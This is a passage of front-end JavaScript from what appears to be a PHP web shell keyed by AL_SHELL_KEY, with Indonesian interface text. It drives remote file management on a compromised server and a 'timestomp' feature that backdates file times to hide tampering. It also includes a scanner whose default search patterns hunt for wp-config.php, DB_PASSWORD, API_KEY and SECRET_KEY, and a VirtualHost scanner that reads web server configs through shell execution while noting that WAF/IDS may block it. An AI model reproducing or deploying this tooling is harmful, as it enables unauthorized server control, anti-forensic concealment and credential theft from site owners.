            alert('Error navigating to directory: ' + error);
        });
});
document.addEventListener('click', function(e) {
    if (e.target.classList.contains('action-link')) {
        const row = e.target.closest('tr');
        if (row) {
            const fileName = row.dataset.filename;
            if (e.target.textContent.includes('[V]')) viewFileAsync(fileName);
            if (e.target.textContent.includes('[E]')) openEditModal(fileName);
            if (e.target.textContent.includes('[R]')) openRenameModal(fileName);
            if (e.target.textContent.includes('[Chmod]')) openChmodModal(fileName);
            if (e.target.textContent.includes('[Del]')) openDeleteModal(fileName);
            if (e.target.textContent.includes('[U]')) unzipFile(fileName);
        }
    }
});
const zipBtn = document.getElementById('zipSelectedBtn');
const chmodBulkBtn = document.getElementById('chmodSelectedBtn');
const timestompBtn = document.getElementById('timestompSelectedBtn');
const deleteBtn = document.getElementById('deleteSelectedBtn');
const selectAllCheckbox = document.getElementById('selectAll');
document.addEventListener('change', function(e) {
    if (e.target.classList.contains('file-select')) {
        const anyChecked = document.querySelectorAll('.file-select:checked').length > 0;
        zipBtn.disabled = !anyChecked;
        chmodBulkBtn.disabled = !anyChecked;
        timestompBtn.disabled = !anyChecked;
        deleteBtn.disabled = !anyChecked;
    }
});
selectAllCheckbox.addEventListener('change', function() {
    const checkboxes = document.querySelectorAll('.file-select');
    checkboxes.forEach(cb => cb.checked = this.checked);
    // Update button state directly
    const anyChecked = this.checked && checkboxes.length > 0;
    zipBtn.disabled = !anyChecked;
    chmodBulkBtn.disabled = !anyChecked;
    timestompBtn.disabled = !anyChecked;
    deleteBtn.disabled = !anyChecked;
});
zipBtn.addEventListener('click', function() {
    const checkboxes = document.querySelectorAll('.file-select:checked');
    if (checkboxes.length === 0) return;
    const formData = new FormData();
    formData.append('action', 'zip_selected');
    checkboxes.forEach(cb => formData.append('selected_files[]', cb.value));
    fetch('', { method: 'POST', body: formData }).then(() => window.location.reload());
});
deleteBtn.addEventListener('click', function() {
    const checkboxes = document.querySelectorAll('.file-select:checked');
    if (checkboxes.length === 0) return;
    if (confirm(`Are you sure you want to delete ${checkboxes.length} selected item(s)?`)) {
        const formData = new FormData();
        formData.append('action', 'delete_selected');
        checkboxes.forEach(cb => formData.append('selected_files[]', cb.value));
        fetch('', { method: 'POST', body: formData }).then(() => window.location.reload());
    }
});
chmodBulkBtn.addEventListener('click', function() {
    const checkboxes = document.querySelectorAll('.file-select:checked');
    if (checkboxes.length === 0) return;
    
    // Update count in modal
    document.getElementById('chmodBulkCount').textContent = checkboxes.length;
    
    // Reset modal state
    document.getElementById('chmodBulkProgress').style.display = 'none';
    document.getElementById('chmodBulkResults').style.display = 'none';
    document.getElementById('chmodBulkExecuteBtn').disabled = false;
    document.getElementById('chmodBulkExecuteBtn').textContent = '🚀 Execute';
    document.getElementById('chmodBulkCloseBtn').textContent = 'Cancel';
    
    openModal('chmodBulkModal');
});

// Timestomp Bulk button click
timestompBtn.addEventListener('click', function() {
    openTimestompBulkModal();
});

// Chmod Bulk execute function
async function executeChmodBulk() {
    const checkboxes = document.querySelectorAll('.file-select:checked');
    const permission = document.getElementById('chmodBulkPerm').value === 'custom' 
        ? document.getElementById('chmodBulkCustomInput').value 
        : document.getElementById('chmodBulkPerm').value;
    const recursive = document.getElementById('chmodBulkRecursive').checked;
    
    if (!permission) {
        alert('Please enter a permission value');
        return;
    }
    
    // UI updates
    const executeBtn = document.getElementById('chmodBulkExecuteBtn');
    const closeBtn = document.getElementById('chmodBulkCloseBtn');
    const progressDiv = document.getElementById('chmodBulkProgress');
    const resultsDiv = document.getElementById('chmodBulkResults');
    const progressBar = document.getElementById('chmodBulkProgressBar');
    const currentSpan = document.getElementById('chmodBulkCurrent');
    const totalSpan = document.getElementById('chmodBulkTotal');
    const statusDiv = document.getElementById('chmodBulkStatus');
    
    executeBtn.disabled = true;
    executeBtn.textContent = '⏳ Processing...';
    closeBtn.textContent = 'Running...';
    progressDiv.style.display = 'block';
    resultsDiv.style.display = 'block';
    resultsDiv.innerHTML = '<div style="color:#6cf">🚀 Starting chmod bulk operation...</div>';
    
    const files = Array.from(checkboxes).map(cb => cb.value);
    
    try {
        const formData = new FormData();
        formData.append('action', 'chmod_bulk');
        formData.append('chmod_perm', permission);
        formData.append('chmod_recursive', recursive ? '1' : '0');
        files.forEach(f => formData.append('selected_files[]', f));
        
        statusDiv.textContent = 'Sending request...';
        
        const response = await fetch('', { method: 'POST', body: formData });
        const data = await response.json();
        
        if (data.success) {
            totalSpan.textContent = data.total;
            currentSpan.textContent = data.total;
            progressBar.style.width = '100%';
            
            // Sort: success first, then failed
            const sortedItems = data.processed.sort((a, b) => {
                if (a.success === b.success) return 0;
                return a.success ? -1 : 1; // Success first
            });
            
            // Build results
            let html = '';
            html += '<div style="margin-bottom:10px;padding:8px;background:#1a1a1a;border-radius:4px;display:flex;gap:15px;">';
            html += '<span style="color:#0f0">✅ Success: ' + data.success_count + '</span>';
            html += '<span style="color:#f44">❌ Failed: ' + data.failed_count + '</span>';
            html += '<span style="color:#888">Total: ' + data.total + '</span>';
            html += '</div>';
            
            // Show processed items with clickable paths (limited to first 100)
            const displayItems = sortedItems.slice(0, 100);
            displayItems.forEach(item => {
                const icon = item.type === 'dir' ? '📁' : '📄';
                const color = item.success ? '#0f0' : '#f44';
                const status = item.success ? '✓' : '✗';
                const encodedDir = encodeURIComponent(item.dir);
                
                html += '<div style="margin:3px 0;font-size:11px;display:flex;align-items:center;gap:8px;">';
                html += '<span style="color:' + color + ';font-weight:bold;min-width:15px;">' + status + '</span>';
                html += '<span style="color:#888">' + icon + '</span>';
                html += '<a href="?masuk=<?php echo AL_SHELL_KEY ?>&d=' + encodedDir + '" ';
                html += 'target="_blank" style="color:#6cf;text-decoration:none;word-break:break-all;" ';
                html += 'title="Open: ' + escapeHtml(item.dir) + '">';
                html += escapeHtml(item.path);
                html += '</a>';
                html += '</div>';
            });
            
            if (sortedItems.length > 100) {
                html += '<div style="color:#888;font-size:10px;margin-top:10px;padding:5px;background:#111;border-radius:4px;">';
                html += '... and ' + (sortedItems.length - 100) + ' more items (showing first 100)</div>';
            }
            
            // Show errors if any (only failed items summary)
            if (data.failed_count > 0) {
                html += '<div style="margin-top:15px;padding:8px;background:#2a0000;border-radius:4px;border:1px solid #f44;">';
                html += '<div style="color:#f44;font-weight:bold;margin-bottom:8px;">❌ Failed Items Summary:</div>';
                const failedItems = sortedItems.filter(item => !item.success).slice(0, 20);
                failedItems.forEach(item => {
                    html += '<div style="color:#f88;font-size:10px;margin:2px 0;word-break:break-all;">• ' + escapeHtml(item.path) + '</div>';
                });
                if (data.failed_count > 20) {
                    html += '<div style="color:#888;font-size:10px;margin-top:5px;">... and ' + (data.failed_count - 20) + ' more failed</div>';
                }
                html += '</div>';
            }
            
            resultsDiv.innerHTML = html;
            statusDiv.innerHTML = '<span style="color:#0f0;font-weight:bold;">✅ Completed!</span>';
            
            executeBtn.textContent = '✅ Done';
            closeBtn.textContent = 'Close';
            
            // Don't auto refresh - let user review results and click paths
        } else {
            throw new Error('Server returned error');
        }
    } catch (error) {
        resultsDiv.innerHTML = '<div style="color:#f44">❌ Error: ' + escapeHtml(error.message) + '</div>';
        statusDiv.innerHTML = '<span style="color:#f44">❌ Failed</span>';
        executeBtn.disabled = false;
        executeBtn.textContent = '🚀 Retry';
        closeBtn.textContent = 'Close';
    }
}

// Chmod bulk permission select change
document.getElementById('chmodBulkPerm').addEventListener('change', function() {
    const customDiv = document.getElementById('chmodBulkCustomDiv');
    if (this.value === 'custom') {
        customDiv.style.display = 'block';
    } else {
        customDiv.style.display = 'none';
    }
});

// 🔥 TIMESTOMP BULK FUNCTIONS

// Apply preset timestamp
function applyTimestompPreset(preset) {
    const timeInput = document.getElementById('timestompBulkTime');
    if (!preset) return;
    
    const now = new Date();
    let targetDate = new Date();
    
    switch(preset) {
        case '1year':
            targetDate.setFullYear(now.getFullYear() - 1);
            break;
        case '6months':
            targetDate.setMonth(now.getMonth() - 6);
            break;
        case '1month':
            targetDate.setMonth(now.getMonth() - 1);
            break;
        case '1week':
            targetDate.setDate(now.getDate() - 7);
            break;
        case 'yesterday':
            targetDate.setDate(now.getDate() - 1);
            break;
        case 'now':
            targetDate = now;
            break;
        default:
            // Reference file - will be handled server-side
            timeInput.value = '';
            timeInput.placeholder = 'Using: ' + preset;
            timeInput.dataset.reference = preset;
            return;
    }
    
    // Format: DD-MM-YYYY HH:MM:SS
    const day = String(targetDate.getDate()).padStart(2, '0');
    const month = String(targetDate.getMonth() + 1).padStart(2, '0');
    const year = targetDate.getFullYear();
    const hours = String(targetDate.getHours()).padStart(2, '0');
    const minutes = String(targetDate.getMinutes()).padStart(2, '0');
    const seconds = String(targetDate.getSeconds()).padStart(2, '0');
    
    timeInput.value = `${day}-${month}-${year} ${hours}:${minutes}:${seconds}`;
    delete timeInput.dataset.reference;
}

// Open timestomp modal
function openTimestompBulkModal() {
    const checkboxes = document.querySelectorAll('.file-select:checked');
    if (checkboxes.length === 0) {
        alert('Please select at least one file or folder');
        return;
    }
    
    document.getElementById('timestompBulkCount').textContent = checkboxes.length;
    
    // Reset form
    document.getElementById('timestompBulkTime').value = '';
    document.getElementById('timestompBulkPreset').value = '';
    document.getElementById('timestompBulkRecursive').checked = false;
    document.getElementById('timestompBulkProgress').style.display = 'none';
    document.getElementById('timestompBulkResults').style.display = 'none';
    
    // Reset buttons
    const executeBtn = document.getElementById('timestompBulkExecuteBtn');
    const closeBtn = document.getElementById('timestompBulkCloseBtn');
    executeBtn.disabled = false;
    executeBtn.textContent = '⏰ Execute Timestomp';
    closeBtn.textContent = 'Cancel';
    
    openModal('timestompBulkModal');
}

// Execute timestomp bulk
async function executeTimestompBulk() {
    const checkboxes = document.querySelectorAll('.file-select:checked');
    const timeInput = document.getElementById('timestompBulkTime');
    const recursive = document.getElementById('timestompBulkRecursive').checked;
    
    let timestamp = timeInput.value.trim();
    let referenceFile = '';
    
    // Check if using reference file
    if (timeInput.dataset.reference) {
        referenceFile = timeInput.dataset.reference;
        timestamp = '';
    } else if (!timestamp) {
        alert('Please enter a timestamp or select a preset');
        return;
    }
    
    // UI updates
    const executeBtn = document.getElementById('timestompBulkExecuteBtn');
    const closeBtn = document.getElementById('timestompBulkCloseBtn');
    const progressDiv = document.getElementById('timestompBulkProgress');
    const resultsDiv = document.getElementById('timestompBulkResults');
    const progressBar = document.getElementById('timestompBulkProgressBar');
    const currentSpan = document.getElementById('timestompBulkCurrent');
    const totalSpan = document.getElementById('timestompBulkTotal');
    const statusDiv = document.getElementById('timestompBulkStatus');
    
    executeBtn.disabled = true;
    executeBtn.textContent = '⏳ Processing...';
    closeBtn.textContent = 'Running...';
    progressDiv.style.display = 'block';
    resultsDiv.style.display = 'block';
    resultsDiv.innerHTML = '<div style="color:#f80">🚀 Starting timestomp operation...</div>';
    
    const files = Array.from(checkboxes).map(cb => cb.value);
    
    try {
        const formData = new FormData();
        formData.append('action', 'timestomp_bulk');
        if (timestamp) formData.append('timestomp_time', timestamp);
        if (referenceFile) formData.append('timestomp_reference', referenceFile);
        formData.append('timestomp_recursive', recursive ? '1' : '0');
        files.forEach(f => formData.append('selected_files[]', f));
        
        statusDiv.textContent = 'Sending request...';
        
        const response = await fetch('', { method: 'POST', body: formData });
        const data = await response.json();
        
        if (data.success) {
            totalSpan.textContent = data.total;
            currentSpan.textContent = data.total;
            progressBar.style.width = '100%';
            
            // Sort: success first, then failed
            const sortedItems = data.processed.sort((a, b) => {
                if (a.success === b.success) return 0;
                return a.success ? -1 : 1;
            });
            
            // Build results
            let html = '';
            html += '<div style="margin-bottom:10px;padding:8px;background:#1a1a1a;border-radius:4px;display:flex;gap:15px;flex-wrap:wrap;">';
            html += '<span style="color:#0f0">✅ Success: ' + data.success_count + '</span>';
            html += '<span style="color:#f44">❌ Failed: ' + data.failed_count + '</span>';
            html += '<span style="color:#888">Total: ' + data.total + '</span>';
            html += '<span style="color:#f80">⏰ Applied: ' + escapeHtml(data.timestamp_applied || 'Unknown') + '</span>';
            html += '</div>';
            
            // Show processed items (limited to first 100)
            const displayItems = sortedItems.slice(0, 100);
            displayItems.forEach(item => {
                const icon = item.type === 'dir' ? '📁' : '📄';
                const color = item.success ? '#0f0' : '#f44';
                const status = item.success ? '✓' : '✗';
                const encodedDir = encodeURIComponent(item.dir);
                
                html += '<div style="margin:3px 0;font-size:11px;display:flex;align-items:center;gap:8px;">';
                html += '<span style="color:' + color + ';font-weight:bold;min-width:15px;">' + status + '</span>';
                html += '<span style="color:#888">' + icon + '</span>';
                html += '<a href="?masuk=<?php echo AL_SHELL_KEY ?>&d=' + encodedDir + '" ';
                html += 'target="_blank" style="color:#6cf;text-decoration:none;word-break:break-all;flex:1;" ';
                html += 'title="Open: ' + escapeHtml(item.dir) + '">';
                html += escapeHtml(item.path);
                html += '</a>';
                if (item.new_time) {
                    html += '<span style="color:#f80;font-size:10px;">' + escapeHtml(item.new_time) + '</span>';
                }
                html += '</div>';
            });
            
            if (sortedItems.length > 100) {
                html += '<div style="color:#888;font-size:10px;margin-top:10px;padding:5px;background:#111;border-radius:4px;">';
                html += '... and ' + (sortedItems.length - 100) + ' more items (showing first 100)</div>';
            }
            
            // Show errors if any
            if (data.failed_count > 0) {
                html += '<div style="margin-top:15px;padding:8px;background:#2a0000;border-radius:4px;border:1px solid #f44;">';
                html += '<div style="color:#f44;font-weight:bold;margin-bottom:8px;">❌ Failed Items Summary:</div>';
                const failedItems = sortedItems.filter(item => !item.success).slice(0, 20);
                failedItems.forEach(item => {
                    html += '<div style="color:#f88;font-size:10px;margin:2px 0;word-break:break-all;">• ' + escapeHtml(item.path) + '</div>';
                });
                if (data.failed_count > 20) {
                    html += '<div style="color:#888;font-size:10px;margin-top:5px;">... and ' + (data.failed_count - 20) + ' more failed</div>';
                }
                html += '</div>';
            }
            
            resultsDiv.innerHTML = html;
            statusDiv.innerHTML = '<span style="color:#0f0;font-weight:bold;">✅ Timestomp Completed!</span>';
            
            executeBtn.textContent = '✅ Done';
            closeBtn.textContent = 'Close';
        } else {
            throw new Error(data.errors?.[0] || 'Server returned error');
        }
    } catch (error) {
        resultsDiv.innerHTML = '<div style="color:#f44">❌ Error: ' + escapeHtml(error.message) + '</div>';
        statusDiv.innerHTML = '<span style="color:#f44">❌ Failed</span>';
        executeBtn.disabled = false;
        executeBtn.textContent = '⏰ Retry';
        closeBtn.textContent = 'Close';
    }
}

function unzipFile(fileName) {
    if (confirm(`Unzip "${fileName}"?`)) {
        const formData = new FormData();
        formData.append('action', 'unzip_file');
        formData.append('unzip_target', fileName);
        fetch('', { method: 'POST', body: formData }).then(() => window.location.reload());
    }
}
function sortTable(columnIndex) {
    const table = document.querySelector(".file-table");
    const tbody = table.querySelector("tbody");
    const rows = Array.from(tbody.querySelectorAll("tr"));
    const headers = table.querySelectorAll("thead th");
    
    // Get current sort state
    const currentSortCol = parseInt(table.dataset.sortCol) || 2;
    let isAscending = table.dataset.sortOrder === 'asc';
    
    // Toggle direction if clicking same column, otherwise default to ascending
    if (currentSortCol === columnIndex) {
        isAscending = !isAscending;
    } else {
        isAscending = true;
    }
    
    table.dataset.sortCol = columnIndex;
    table.dataset.sortOrder = isAscending ? 'asc' : 'desc';
    
    // Update header indicators
    headers.forEach((th, idx) => {
        th.classList.remove('sort-asc', 'sort-desc');
        const indicator = th.querySelector('.sort-indicator');
        if (indicator) indicator.textContent = '';
        
        if (idx === columnIndex) {
            th.classList.add(isAscending ? 'sort-asc' : 'sort-desc');
            if (indicator) indicator.textContent = isAscending ? '↑' : '↓';
        }
    });
    
    rows.sort((a, b) => {
        if (!a.hasAttribute('data-filename')) return -1;
        if (!b.hasAttribute('data-filename')) return 1;
        let aVal = a.children[columnIndex].textContent.trim();
        let bVal = b.children[columnIndex].textContent.trim();
        // Size column (index 4)
        if (columnIndex === 4) {
            if (aVal === '-') aVal = -1;
            else aVal = parseFloat(aVal.replace(' MB', ''));
            if (bVal === '-') bVal = -1;
            else bVal = parseFloat(bVal.replace(' MB', ''));
        } else if (columnIndex === 5) {
            // Modified column (index 5)
            const parseDate = (str) => {
                const parts = str.split(' ');
                const dParts = parts[0].split('-');
                return new Date(`${dParts[2]}-${dParts[1]}-${dParts[0]} ${parts[1]}`).getTime();
            };
            aVal = parseDate(aVal);
            bVal = parseDate(bVal);
        }
        if (aVal < bVal) return isAscending ? -1 : 1;
        if (aVal > bVal) return isAscending ? 1 : -1;
        return 0;
    });
    tbody.innerHTML = "";
    rows.forEach(row => tbody.appendChild(row));
}
(function initDragDropUpload() {
    const dropZone = document.getElementById('dropZone');
    const fileInput = document.getElementById('uploadFileInput');
    const fileList = document.getElementById('dropFileList');
    const submitBtn = document.getElementById('uploadSubmitBtn');
    const uploadForm = document.getElementById('uploadForm');
    const fileCountSpan = document.getElementById('fileCount');
    if (!dropZone || !fileInput) return;
    let selectedFiles = [];
    ['dragenter', 'dragover', 'dragleave', 'drop'].forEach(eventName => {
        dropZone.addEventListener(eventName, preventDefaults, false);
        document.body.addEventListener(eventName, preventDefaults, false);
    });
    ['dragenter', 'dragover'].forEach(eventName => {
        dropZone.addEventListener(eventName, highlight, false);
    });
    ['dragleave', 'drop'].forEach(eventName => {
        dropZone.addEventListener(eventName, unhighlight, false);
    });
    dropZone.addEventListener('drop', handleDrop, false);
    fileInput.addEventListener('change', function() {
        if (this.files.length > 0) {
            handleFiles(Array.from(this.files));
        }
    });
    dropZone.addEventListener('click', function(e) {
        if (e.target.classList.contains('drop-file-remove')) {
            e.stopPropagation();
            const index = parseInt(e.target.dataset.index);
            removeFile(index);
        }
    });
    function preventDefaults(e) {
        e.preventDefault();
        e.stopPropagation();
    }
    function highlight(e) {
        dropZone.classList.add('drag-over');
    }
    function unhighlight(e) {
        dropZone.classList.remove('drag-over');
    }
    function handleDrop(e) {
        const dt = e.dataTransfer;
        const files = dt.files;
        if (files.length > 0) {
            handleFiles(Array.from(files));
        }
    }
    function handleFiles(files) {
        selectedFiles = selectedFiles.concat(files);
        updateFileList();
    }
    function updateFileList() {
        if (selectedFiles.length === 0) {
            fileList.innerHTML = '';
            submitBtn.disabled = true;
            submitBtn.innerHTML = '📤 Upload <span id="fileCount">0</span> File(s)';
            return;
        }
        let html = '';
        selectedFiles.forEach((file, index) => {
            const fileSize = formatFileSize(file.size);
            html += `
                <div class="drop-file-item">
                    <span class="drop-file-name">${escapeHtml(file.name)}</span>
                    <span class="drop-file-size">${fileSize}</span>
                    <span class="drop-file-remove" data-index="${index}" title="Hapus">❌</span>
                </div>
            `;
        });
        fileList.innerHTML = html;
        submitBtn.disabled = false;
        submitBtn.innerHTML = `📤 Upload ${selectedFiles.length} File(s)`;
    }
    function removeFile(index) {
        selectedFiles.splice(index, 1);
        updateFileList();
    }
    function formatFileSize(bytes) {
        if (bytes === 0) return '0 B';
        const k = 1024;
        const sizes = ['B', 'KB', 'MB', 'GB'];
        const i = Math.floor(Math.log(bytes) / Math.log(k));
        return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
    }
    
    // Handle form submission with FormData
    uploadForm.addEventListener('submit', function(e) {
        e.preventDefault();
        if (selectedFiles.length === 0) return;
        
        const formData = new FormData(uploadForm);
        // Clear existing files and add selected files
        // Note: FormData from the form already has files from fileInput
        // We need to replace them with our selectedFiles
        
        // Since we can't easily replace files in FormData, 
        // we'll create a new FormData and manually add fields
        const newFormData = new FormData();
        newFormData.append('masuk', '<?php echo AL_SHELL_KEY ?>');
        newFormData.append('d', '<?php echo htmlspecialchars($dir) ?>');
        
        selectedFiles.forEach((file, index) => {
            newFormData.append('upload_file[]', file);
        });
        
        // Show loading state
        submitBtn.disabled = true;
        submitBtn.innerHTML = '⏳ Uploading...';
        
        fetch('', {
            method: 'POST',
            body: newFormData
        })
        .then(response => response.text())
        .then(html => {
            // Parse response to check for success/error
            const parser = new DOMParser();
            const doc = parser.parseFromString(html, 'text/html');
            const output = doc.querySelector('.output');
            
            if (output) {
                alert(output.textContent.trim());
            } else {
                alert('Upload completed!');
            }
            
            // Reset form
            selectedFiles = [];
            updateFileList();
            fileInput.value = '';
            
            // Refresh page to show new files
            window.location.reload();
        })
        .catch(error => {
            alert('Upload failed: ' + error.message);
            submitBtn.disabled = false;
            submitBtn.innerHTML = '📤 Upload ' + selectedFiles.length + ' File(s)';
        });
    });
})();
let currentSearchType = 'filename';
let currentScanMode = 'standard';
let isScanning = false;
function discoverWebsites() {
    openModal('websiteDiscoverModal');
    resetDiscoverModal();
}
function resetDiscoverModal() {
    document.getElementById('websiteDiscoverContent').innerHTML = `
        <div class="discover-placeholder">
            <span style="font-size:50px;">🌐</span>
            <h3 style="color:#6cf;margin:15px 0;">🌐 Website Discovery</h3>
            <p style="color:#888;">Konfigurasi pencarian di panel kiri, lalu klik "Mulai Scan"</p>
            <div style="margin-top:20px;text-align:left;padding:15px;background:#1a1a1a;border-radius:6px;font-size:11px;">
                <p style="color:#6cf;margin-bottom:10px;"><strong>💡 Tips Penggunaan:</strong></p>
                <p style="color:#888;margin:5px 0;"><strong>📄 Mode Nama File:</strong></p>
                <p style="color:#666;margin:3px 0;padding-left:10px;">• index.php, index.html, .htaccess</p>
                <p style="color:#666;margin:3px 0;padding-left:10px;">• wp-config.php, configuration.php</p>
                <p style="color:#666;margin:3px 0;padding-left:10px;">• *.php, config.* (wildcard)</p>
                <p style="color:#888;margin:10px 0 5px 0;"><strong>📝 Mode Konten:</strong></p>
                <p style="color:#666;margin:3px 0;padding-left:10px;">• DB_PASSWORD, username, password</p>
                <p style="color:#666;margin:3px 0;padding-left:10px;">• API_KEY, SECRET_KEY, token</p>
            </div>
        </div>
    `;
}
let currentDbConfig = {};
function selectSearchType(type) {
    currentSearchType = type;
    document.querySelectorAll('.search-type').forEach(el => el.classList.remove('active'));
    document.querySelector('.search-type[data-type="' + type + '"]').classList.add('active');
    const patternInput = document.getElementById('searchPattern');
    const hintText = document.getElementById('patternHint');
    if (type === 'filename') {
        patternInput.placeholder = 'index.php, index.html, .htaccess';
        hintText.textContent = 'Contoh: *.php, config.*, wp-config.php';
        patternInput.value = 'index.php, index.html, .htaccess';
    } else {
        patternInput.placeholder = 'DB_PASSWORD, username, api_key';
        hintText.textContent = 'Cari file yang mengandung string ini';
        patternInput.value = 'DB_PASSWORD, password, username';
    }
}
function selectScanMode(mode) {
    currentScanMode = mode;
    document.querySelectorAll('.scan-mode').forEach(el => el.classList.remove('active'));
    document.querySelector('.scan-mode[data-mode="' + mode + '"]').classList.add('active');
}
function startWebsiteScan() {
    if (isScanning) return;
    const patternInput = document.getElementById('searchPattern').value.trim();
    if (!patternInput) {
        alert('Masukkan pattern pencarian!');
        return;
    }
    isScanning = true;
    const content = document.getElementById('websiteDiscoverContent');
    const startTime = Date.now();
    const statsDiv = document.getElementById('scanStats');
    const timeSpan = document.getElementById('scanTime');
    const countSpan = document.getElementById('scanCount');
    const statusSpan = document.getElementById('scanStatus');
    const extractTitle = document.getElementById('extractTitle').checked;
    const showPreview = document.getElementById('showPreview').checked;
    document.getElementById('startScanBtn').disabled = true;
    document.getElementById('startScanBtn').textContent = '- Scanning...';
    statsDiv.style.display = 'block';
    statusSpan.textContent = currentSearchType === 'filename' ? 'Mencari file...' : 'Mencari konten...';
    const timerInterval = setInterval(() => {
        const elapsed = Math.floor((Date.now() - startTime) / 1000);
        timeSpan.textContent = elapsed + 's';
    }, 1000);
    const modeLabels = {
        'quick': '⚡ Quick',
        'standard': '📊 Standard',
        'deep': '🎯 Deep',
        'brutal': '💀 Brutal'
    };
    const scanModeDepth = {
        'quick': '1-2',
        'standard': '3-4',
        'deep': '5-6',
        'brutal': '8+'
    };
    const params = new URLSearchParams();
    params.append('masuk', '<?php echo AL_SHELL_KEY ?>');
    params.append('action', 'discover_websites');
    params.append('mode', currentScanMode);
    params.append('search_type', currentSearchType);
    params.append('pattern', patternInput);
    params.append('extract_title', extractTitle ? '1' : '0');
    params.append('show_preview', showPreview ? '1' : '0');
    fetch('?' + params.toString())
        .then(response => {
            if (!response.ok) {
                throw new Error('HTTP ' + response.status + ': ' + response.statusText);
            }
            return response.text();
        })
        .then(text => {
            let data;
            try {
                data = JSON.parse(text);
            } catch (e) {
                console.error('Invalid JSON response:', text);
                throw new Error('Invalid server response');
            }
            if (!Array.isArray(data)) {
                throw new Error('Unexpected response format');
            }
            return data;
        })
        .then(data => {
            clearInterval(timerInterval);
            if (data.length === 0) {
                content.innerHTML = '<p style="color: #f44; text-align: center; padding: 50px;">❌ Tidak ditemukan website di server ini.</p>';
                document.getElementById('startScanBtn').textContent = '🔄 Mulai Scan Ulang';
                document.getElementById('startScanBtn').disabled = false;
                isScanning = false;
                statusSpan.textContent = 'Tidak ditemukan';
                return;
            }
            countSpan.textContent = data.length;
            statusSpan.textContent = 'Selesai!';
            document.getElementById('startScanBtn').textContent = '✅ Scan Selesai';
            isScanning = false;
            if (currentSearchType === 'filename') {
                renderFilenameResults(data, content);
            } else {
                renderContentResults(data, content);
            }
        })
        .catch(error => {
            console.error('Discover Websites Error:', error);
            content.innerHTML = '<div style="color: #f44; padding: 20px; text-align: center;">' +
                '<p>❌ Error: ' + escapeHtml(error.message) + '</p>' +
                '<p style="font-size: 11px; color: #666; margin-top: 10px;">Coba refresh dan jalankan lagi</p>' +
                '</div>';
        });
}

// 🔥 VIRTUALHOST SCANNER - Find Apache/Nginx domains
try {
    scanVirtualHosts = async function(serverType) {
        const content = document.getElementById('websiteDiscoverContent');
        const statsDiv = document.getElementById('scanStats');
        
        content.innerHTML = '<div style="padding: 30px; text-align: center;">' +
            '<div style="font-size: 40px; margin-bottom: 15px;">🔍</div>' +
            '<div style="color: #6cf; font-size: 16px; margin-bottom: 10px;">Scanning ' + (serverType === 'all' ? 'All Web Servers' : serverType.toUpperCase()) + '...</div>' +
            '<div style="color: #888; font-size: 12px;">Mencari konfigurasi VirtualHost...</div>' +
            '<div style="margin-top: 20px; color: #666; font-size: 11px;">Path: /etc/apache2/sites-available /etc/nginx/sites-enabled</div>' +
            '</div>';
        
        statsDiv.style.display = 'block';
        document.getElementById('scanStatus').textContent = 'Scanning VirtualHosts...';
        
        try {
            const response = await fetch('?masuk=<?php echo AL_SHELL_KEY ?>&action=scan_virtualhosts&server_type=' + serverType);
            
            // Check if response is OK
            if (!response.ok) {
                throw new Error('HTTP Error: ' + response.status + ' ' + response.statusText);
            }
            
            // Get response text first
            const responseText = await response.text();
            
            // Check if response is empty
            if (!responseText || responseText.trim() === '') {
                throw new Error('Server returned empty response. Command may be blocked by server.');
            }
            
            // Try to parse JSON
            let data;
            try {
                data = JSON.parse(responseText);
            } catch (parseError) {
                console.error('JSON Parse Error:', parseError);
                console.error('Response Text:', responseText.substring(0, 500));
                throw new Error('Invalid JSON response. Server may have blocked the command or returned error.');
            }
            
            if (!data.success) {
                const errorMsg = data.error || 'Scan failed';
                const details = data.details || '';
                throw new Error(errorMsg + (details ? ' (' + details + ')' : ''));
            }
            
            // Combine all results
            let allVhosts = [];
            
            if (data.apache && data.apache.length > 0) {
                data.apache.forEach(vhost => {
                    allVhosts.push({
                        domain: vhost.domain,
                        docroot: vhost.docroot,
                        aliases: vhost.aliases || [],
                        server: 'Apache',
                        listen: vhost.listen || '80/443'
                    });
                });
            }
            
            if (data.nginx && data.nginx.length > 0) {
                data.nginx.forEach(vhost => {
                    allVhosts.push({
                        domain: vhost.domain,
                        docroot: vhost.docroot,
                        aliases: [],
                        server: 'Nginx',
                        listen: vhost.listen || '80'
                    });
                });
            }
            
            if (data.litespeed && data.litespeed.length > 0) {
                data.litespeed.forEach(vhost => {
                    allVhosts.push({
                        domain: vhost.domain,
                        docroot: vhost.docroot,
                        aliases: [],
                        server: 'LiteSpeed',
                        listen: vhost.listen || '80/443'
                    });
                });
            }
            
            // Remove duplicates by domain
            const seen = new Set();
            allVhosts = allVhosts.filter(vhost => {
                const duplicate = seen.has(vhost.domain);
                seen.add(vhost.domain);
                return !duplicate;
            });
            
            // Update stats
            document.getElementById('scanCount').textContent = allVhosts.length;
            document.getElementById('scanStatus').textContent = 'Selesai!';
            
            if (allVhosts.length === 0) {
                content.innerHTML = '<div style="padding: 30px; text-align: center;">' +
                    '<div style="font-size: 40px; margin-bottom: 15px;">📭</div>' +
                    '<div style="color: #f44; font-size: 16px; margin-bottom: 10px;">Tidak ditemukan VirtualHost</div>' +
                    '<div style="color: #888; font-size: 12px;">Mungkin web server tidak terinstall atau path berbeda</div>' +
                    '</div>';
                return;
            }
            
            // Render results
            renderVirtualHostResults(allVhosts, content, data);
            
        } catch (error) {
            let errorHtml = '<div style="color: #f44; padding: 20px; text-align: center; background: #1a0000; border: 1px solid #f44; border-radius: 4px;">';
            errorHtml += '<div style="font-size: 30px; margin-bottom: 10px;">⚠️</div>';
            errorHtml += '<p style="font-weight: bold; font-size: 14px;">❌ Error: ' + escapeHtml(error.message) + '</p>';
            
            // Add troubleshooting tips
            errorHtml += '<div style="margin-top: 15px; text-align: left; background: #000; padding: 10px; border-radius: 3px;">';
            errorHtml += '<p style="font-size: 11px; color: #f80; margin-bottom: 8px;">🔧 Kemungkinan penyebab:</p>';
            errorHtml += '<ul style="font-size: 10px; color: #888; margin: 0; padding-left: 15px;">';
            errorHtml += '<li>Shell execution functions (shell_exec, exec, system) disabled</li>';
            errorHtml += '<li>SELinux/AppArmor blocking commands</li>';
            errorHtml += '<li>WAF/IDS blocking the request</li>';
            errorHtml += '<li>Insufficient permissions to read config files</li>';
            errorHtml += '<li>Web server configuration not in standard paths</li>';
            errorHtml += '</ul>';
            errorHtml += '</div>';
            
            errorHtml += '<p style="font-size: 10px; color: #666; margin-top: 10px;">Coba jalankan command manual via shell untuk verifikasi</p>';
            errorHtml += '</div>';
            
            content.innerHTML = errorHtml;
